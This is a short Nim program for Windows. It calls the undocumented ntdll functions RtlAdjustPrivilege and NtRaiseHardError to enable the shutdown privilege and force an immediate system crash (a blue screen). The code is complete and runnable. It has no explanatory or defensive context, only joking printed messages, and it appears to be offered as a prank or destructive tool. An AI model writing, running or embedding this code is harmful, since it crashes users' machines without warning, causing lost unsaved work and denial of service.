# Addressme(🐘)
import winim/lean

proc RtlAdjustPrivilege(Privilege: ULONG, Enable: BOOLEAN, CurrThread: BOOLEAN, 
                        StatusPointer: ptr BOOLEAN): NTSTATUS 
  {.importc, stdcall, dynlib: "ntdll.dll".}

proc NtRaiseHardError(ErrorStatus: LONG, Unless1: ULONG, Unless2: ULONG, 
                      Unless3: ptr ULONG_PTR, ValidResponseOption: ULONG, 
                      ResponsePointer: ptr ULONG): NTSTATUS
  {.importc, stdcall, dynlib: "ntdll.dll".}

const STATUS_IN_PAGE_ERROR = 0xC0000006'i32

proc main() =
  var PrivilegeState: BOOLEAN = FALSE
  var ErrorResponse: ULONG = 0
  
  discard RtlAdjustPrivilege(19, TRUE, FALSE, addr PrivilegeState)
  echo "Crashma"
  discard NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, nil, 6, addr ErrorResponse)
  echo "Crash BALLS!"

main()
